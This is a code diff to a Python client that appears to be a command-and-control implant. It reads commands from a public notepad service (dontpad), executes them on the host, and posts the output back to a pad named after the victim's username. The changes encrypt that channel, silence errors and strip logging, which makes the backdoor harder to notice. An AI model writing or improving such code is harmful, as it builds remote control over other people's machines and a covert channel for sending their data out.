@@ -3,6 +3,7 @@ import time
 import subprocess
 from observer import Observer
 import getpass
+from criptographer import Criptographer
 
 class Client:
     def __init__(self, url):
@@ -10,8 +11,10 @@ class Client:
         self.command = ''
         self.result = ''
         self.first_run = True
+        self.username = getpass.getuser()
     
     def start(self, command_body):
+        print("Comando recebido: ", command_body)
         if self.first_run:
             self.first_run = False
             self.send_result_to_c2()
@@ -19,14 +22,17 @@ class Client:
         self.execute_command(command_body)
 
     def parse_text_dontpad(self, data):
-        if "___________________" in data:
-            parts = data.split("___________________", 1)
-            self.command = parts[0].strip()
-            self.result = parts[1].strip()
-        else:
-            self.command = data.strip()
-            self.result = ""
-
+        try:
+            decrypted_data = Criptographer.decrypt(data, self.username)
+            if "___________________" in decrypted_data:
+                parts = decrypted_data.split("___________________", 1)
+                self.command = parts[0].strip()
+                self.result = parts[1].strip()
+            else:
+                self.command = data.strip()
+                self.result = ""
+        except:
+            pass
     def execute_command(self, command_body):
         self.parse_text_dontpad(command_body)
         if self.command is None or self.command.lower() == "exit":
@@ -55,17 +61,32 @@ class Client:
 
     def send_result_to_c2(self):
         data = {
-            "text": self.command + "\n___________________\n\n" + self.result,
+            "text": Criptographer.encrypt(self.command + "\n___________________\n\n" + self.result, self.username),
             "lastModified": int(time.time() * 1000),
             "force": "true",
             "session-token": "-25751fc88e6e559870fd"
         }
-        response = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}", data=data)
-        print(f"Send result: [{response.status_code}] - {data}")
+        
+        requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}", data=data)
 
 
 if __name__ == "__main__":
-    url_with_username = f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}.body.json?lastModified=0&session-token=-25751fc88e6e559870fd"
+    username = getpass.getuser()
+
+    base_url = "https://api.dontpad.com"
+    pad_name = "yaguinhofodinha"
+    session_token = "-25751fc88e6e559870fd"
+
+    url_with_username = (
+        f"{base_url}/{pad_name}/{username}.body.json"
+        f"?lastModified=0&session-token={session_token}"
+    )
+
+    first_url = (
+        f"{base_url}/{pad_name}.body.json"
+        f"?lastModified=0&session-token={session_token}"
+    )
+
     client = Client(url=url_with_username)
-    observer = Observer(first_url="https://api.dontpad.com/yaguinhofodinha.body.json?lastModified=0&session-token=-25751fc88e6e559870fd", url_with_username=url_with_username, client=client)
+    observer = Observer(first_url=first_url, url_with_username=url_with_username, client=client)
     observer.start()
